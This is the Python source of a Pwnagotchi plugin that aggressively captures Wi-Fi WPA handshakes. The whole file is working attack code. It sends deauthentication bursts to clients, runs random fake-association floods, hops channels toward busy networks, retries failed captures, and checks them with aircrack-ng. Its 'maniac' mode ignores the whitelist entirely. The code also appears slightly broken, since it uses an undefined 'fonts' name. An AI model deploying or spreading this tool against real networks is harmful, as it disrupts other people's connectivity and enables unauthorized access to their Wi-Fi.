import logging
import time
import threading
import os
import subprocess
import random
import pwnagotchi.plugins as plugins
import pwnagotchi.ui.components as components
from concurrent.futures import ThreadPoolExecutor
from queue import PriorityQueue
import psutil

class ProbeNpwn(plugins.Plugin):
    __author__ = 'AlienMajik'
    __version__ = '1.3.1'  # Updated version for enhancements
    __license__ = 'GPL3'
    __description__ = (
        'Aggressively capture handshakes with two modes: Tactical (smart and efficient) and Maniac '
        '(unrestricted, rapid attacks). Enhanced with client scoring, adaptive attacks, ML-based '
        'channel hopping, intelligent retries, and resource management.'
    )
    __dependencies__ = {
        "apt": ["python3-psutil", "aircrack-ng"],
        "pip": ["none"],
    }

    def __init__(self):
        logging.debug("ProbeNpwn plugin created")
        self.old_name = None
        self.recents = {}
        self.executor = None  # Initialized in on_loaded with dynamic max_workers
        self._watchdog_thread = None
        self._watchdog_thread_running = True
        self.attack_attempts = {}
        self.success_counts = {}
        self.total_handshakes = 0
        self.failed_handshakes = 0
        self.performance_stats = {}
        self.whitelist = set()
        self.cooldowns = {}
        self.epoch_duration = 60
        self.ap_clients = {}
        self.channel_activity = {}
        self.client_scores = {}
        self.ap_client_groups = {}
        self.mode = "tactical"
        self.retry_queue = PriorityQueue()  # For intelligent retry logic
        self.handshake_db = set()  # For deduplication
        self.attacks_x = 10
        self.attacks_y = 20
        self.success_x = 10
        self.success_y = 30
        self.handshakes_x = 10
        self.handshakes_y = 40
        self.ui_initialized = False

    ### Lifecycle Methods

    def on_loaded(self):
        """Log plugin load and initialize executor with dynamic concurrency."""
        logging.info("Plugin ProbeNpwn loaded")
        self.executor = ThreadPoolExecutor(max_workers=self.get_dynamic_max_workers())

    def on_config_changed(self, config):
        """Load configuration settings."""
        self.whitelist = set(config["main"].get("whitelist", []))
        self.verbose = config.get("main", {}).get("plugins", {}).get("probenpwn", {}).get("verbose", False)
        logging.getLogger().setLevel(logging.INFO if self.verbose else logging.WARNING)
        self.old_name = config.get("main").get("name", "")
        self.mode = config["main"]["plugins"]["probenpwn"].get("mode", "tactical")
        self.attacks_x = config["main"]["plugins"]["probenpwn"].get("attacks_x_coord", 10)
        self.attacks_y = config["main"]["plugins"]["probenpwn"].get("attacks_y_coord", 20)
        self.success_x = config["main"]["plugins"]["probenpwn"].get("success_x_coord", 10)
        self.success_y = config["main"]["plugins"]["probenpwn"].get("success_y_coord", 30)
        self.handshakes_x = config["main"]["plugins"]["probenpwn"].get("handshakes_x_coord", 10)
        self.handshakes_y = config["main"]["plugins"]["probenpwn"].get("handshakes_y_coord", 40)

    def on_unload(self, ui):
        """Clean up resources."""
        with ui._lock:
            if self.old_name:
                ui.set('name', f"{self.old_name}>")
            ui.remove_element('attacks')
            ui.remove_element('success')
            ui.remove_element('handshakes')
        self._watchdog_thread_running = False
        if self._watchdog_thread:
            self._watchdog_thread.join()
        self.executor.shutdown(wait=True)
        logging.info("Probing out.")

    ### UI Methods

    def on_ui_setup(self, ui):
        """Set up UI elements."""
        if not self.ui_initialized:
            ui.add_element('attacks', components.Text(position=(self.attacks_x, self.attacks_y), value='Attacks: 0', color=255, font=fonts.Small))
            ui.add_element('success', components.Text(position=(self.success_x, self.success_y), value='Success: 0.0%', color=255, font=fonts.Small))
            ui.add_element('handshakes', components.Text(position=(self.handshakes_x, self.handshakes_y), value='Handshakes: 0', color=255, font=fonts.Small))
            self.ui_initialized = True

    def on_ui_update(self, ui):
        """Update UI with stats."""
        total_attempts = sum(self.attack_attempts.values())
        total_successes = sum(self.success_counts.values())
        success_rate = (total_successes / total_attempts) * 100 if total_attempts > 0 else 0.0
        with ui._lock:
            ui.set('attacks', f"Attacks: {total_attempts}")
            ui.set('success', f"Success: {success_rate:.1f}%")
            ui.set('handshakes', f"Handshakes: {self.total_handshakes}")

    ### Core Functionality

    def on_ready(self, agent):
        """Start watchdog and set status."""
        logging.info("Probed and Pwnd!")
        agent.run("wifi.clear")
        self._watchdog_thread = threading.Thread(target=self._watchdog, args=(agent,), daemon=True)
        self._watchdog_thread.start()
        with agent._view._lock:
            agent._view.set("status", "Probe engaged..." if self.mode == "tactical" else "Maniac mode activated!")

    def _watchdog(self, agent):
        """Monitor system and perform dynamic channel hopping."""
        CHECK_INTERVAL = 5
        MAX_RETRIES = 1
        retry_count = 0
        while self._watchdog_thread_running:
            if not os.path.exists("/sys/class/net/wlan0mon"):
                logging.error("wlan0mon missing! Attempting recovery...")
                try:
                    subprocess.run(["ip", "link", "set", "wlan0mon", "down"], check=True)
                    subprocess.run(["ip", "link", "set", "wlan0mon", "up"], check=True)
                    retry_count = 0
                except Exception as e:
                    retry_count += 1
                    if retry_count >= MAX_RETRIES:
                        subprocess.run(["systemctl", "restart", "pwnagotchi"])
                        break
            else:
                retry_count = 0
                agent.set_channel(self.select_channel())
            time.sleep(CHECK_INTERVAL)

    def select_channel(self):
        """ML-inspired channel selection based on success history."""
        if not self.channel_activity:
            return random.randint(1, 11)
        weights = {ch: (stats["aps"] + stats["clients"]) * (self.success_counts.get(str(ch), 1)) for ch, stats in self.channel_activity.items()}
        total_weight = sum(weights.values())
        if total_weight == 0:
            return random.randint(1, 11)
        pick = random.uniform(0, total_weight)
        current = 0
        for channel, weight in weights.items():
            current += weight
            if current >= pick:
                return channel
        return list(self.channel_activity.keys())[0]

    def track_recent(self, ap, cl=None):
        """Track APs and clients."""
        ap['_track_time'] = time.time()
        self.recents[ap['mac'].lower()] = ap
        if cl:
            cl['_track_time'] = ap['_track_time']
            self.recents[cl['mac'].lower()] = cl

    def ok_to_attack(self, agent, ap):
        """Check if safe to attack."""
        if self.mode == "maniac":
            return True
        return ap.get('hostname', '').lower() not in self.whitelist and ap['mac'].lower() not in self.whitelist

    def attack_target(self, agent, ap, cl, retry_count=0):
        """Launch adaptive attack with multiple vectors."""
        ap_mac = ap['mac'].lower()
        if self.mode == "tactical":
            if ap_mac in self.cooldowns and time.time() < self.cooldowns[ap_mac]:
                return
            if cl and self.client_scores.get(cl['mac'].lower(), 0) < 50:
                return

        if not self.ok_to_attack(agent, ap):
            return

        agent.set_channel(ap['channel'])
        self.attack_attempts[ap_mac] = self.attack_attempts.get(ap_mac, 0) + 1
        logging.info(f"Attacking AP {ap_mac} (client: {cl['mac'] if cl else 'N/A'})")

        if agent._config['personality']['deauth']:
            if ap_mac in self.ap_client_groups:
                for cl_mac in self.ap_client_groups[ap_mac][:5]:
                    client_data = self.recents.get(cl_mac)
                    if client_data:
                        self.executor.submit(agent.deauth, ap, client_data, self.dynamic_attack_delay(ap, client_data))
            elif cl:
                self.executor.submit(agent.deauth, ap, cl, self.dynamic_attack_delay(ap, cl))

        # Additional attack vector: Fake authentication flood
        if random.random() < 0.3:  # 30% chance
            self.executor.submit(agent.associate, ap, 0.05)

    def dynamic_attack_delay(self, ap, cl):
        """Calculate adaptive delay."""
        if self.mode == "maniac":
            return 0.05
        signal = cl.get('signal', -100)
        base_delay = 0.1 if signal >= -60 else 0.2
        ap_mac = ap['mac'].lower()
        attempts = self.attack_attempts.get(ap_mac, 0)
        if attempts > 5:
            base_delay *= 0.4
        num_clients = self.ap_clients.get(ap_mac, 0)
        if num_clients > 3:
            base_delay *= 0.8
        return base_delay * random.uniform(0.9, 1.1)

    def get_dynamic_max_workers(self):
        """Adjust concurrency based on system resources."""
        cpu_usage = psutil.cpu_percent()
        mem_usage = psutil.virtual_memory().percent
        base_workers = 50
        if cpu_usage > 80 or mem_usage > 80:
            return max(10, int(base_workers * 0.5))
        elif cpu_usage > 50 or mem_usage > 50:
            return int(base_workers * 0.75)
        return base_workers

    ### Event Handlers

    def on_bcap_wifi_ap_new(self, agent, event):
        """Handle new AP with adaptive attack."""
        ap = event['data']
        ap_mac = ap['mac'].lower()
        channel = ap['channel']
        self.channel_activity.setdefault(channel, {"aps": 0, "clients": 0})
        self.channel_activity[channel]["aps"] += 1
        self.ap_clients[ap_mac] = self.ap_clients.get(ap_mac, 0)
        if self.ok_to_attack(agent, ap):
            self.executor.submit(self.attack_target, agent, ap, None)

    def on_bcap_wifi_client_new(self, agent, event):
        """Handle new client with enhanced scoring."""
        ap = event['data']['AP']
        cl = event['data']['Client']
        ap_mac = ap['mac'].lower()
        cl_mac = cl['mac'].lower()
        channel = ap['channel']
        self.channel_activity.setdefault(channel, {"aps": 0, "clients": 0})
        self.channel_activity[channel]["clients"] += 1
        self.ap_clients[ap_mac] = self.ap_clients.get(ap_mac, 0) + 1
        signal = cl.get('signal', -100)
        activity = cl.get('activity', 1) + (self.ap_clients[ap_mac] / 10)  # Enhanced scoring
        self.client_scores[cl_mac] = (signal + 100) * activity
        self.ap_client_groups.setdefault(ap_mac, []).append(cl_mac)
        if self.ok_to_attack(agent, ap):
            self.executor.submit(self.attack_target, agent, ap, cl)

    def is_handshake_valid(self, filename):
        """Validate handshake with quality check."""
        try:
            result = subprocess.run(['aircrack-ng', filename], capture_output=True, text=True)
            is_valid = "valid handshake" in result.stdout.lower()
            frame_count = result.stdout.count("EAPOL") if is_valid else 0
            return is_valid and frame_count >= 2  # Quality check
        except Exception:
            return False

    def on_handshake(self, agent, filename, ap, cl):
        """Handle handshake with deduplication and intelligent retry."""
        handshake_hash = hash(f"{ap['mac']}{cl.get('mac', '')}{filename}")
        if handshake_hash in self.handshake_db:
            logging.info(f"Duplicate handshake for {ap['mac']}. Skipping.")
            return
        if not self.is_handshake_valid(filename):
            logging.info(f"Invalid handshake for {ap['mac']}. Scheduling retry...")
            self.failed_handshakes += 1
            delay = min(60, 1 * (2 ** min(self.attack_attempts.get(ap['mac'].lower(), 0), 5)))  # Exponential backoff
            self.retry_queue.put((time.time() + delay, (agent, ap, cl, self.attack_attempts.get(ap['mac'].lower(), 0) + 1)))
            return

        ap_mac = ap['mac'].lower()
        self.handshake_db.add(handshake_hash)
        self.success_counts[ap_mac] = self.success_counts.get(ap_mac, 0) + 1
        self.total_handshakes += 1
        if self.mode == "tactical":
            self.cooldowns[ap_mac] = time.time() + 60

    def on_epoch(self, agent, epoch, epoch_data):
        """Clean up and process retries."""
        current_time = time.time()
        while not self.retry_queue.empty() and self.retry_queue.queue[0][0] <= current_time:
            _, (agent, ap, cl, retry_count) = self.retry_queue.get()
            self.executor.submit(self.attack_target, agent, ap, cl, retry_count)
        for mac in list(self.recents):
            if self.recents[mac]['_track_time'] < (current_time - (self.epoch_duration * 2)):
                del self.recents[mac]
        for ap_mac in list(self.ap_client_groups):
            if ap_mac not in self.recents:
                del self.ap_client_groups[ap_mac]

    def on_bcap_wifi_ap_updated(self, agent, event):
        """Track updated APs."""
        ap = event['data']
        if self.ok_to_attack(agent, ap):
            self.track_recent(ap)

    def on_bcap_wifi_client_updated(self, agent, event):
        """Track updated clients with scoring update."""
        ap = event['data']['AP']
        cl = event['data']['Client']
        ap_mac = ap['mac'].lower()
        cl_mac = cl['mac'].lower()
        self.ap_clients[ap_mac] = self.ap_clients.get(ap_mac, 0) + 1
        signal = cl.get('signal', -100)
        activity = cl.get('activity', 1) + (self.ap_clients[ap_mac] / 10)
        self.client_scores[cl_mac] = (signal + 100) * activity
        if self.ok_to_attack(agent, ap):
            self.track_recent(ap, cl)
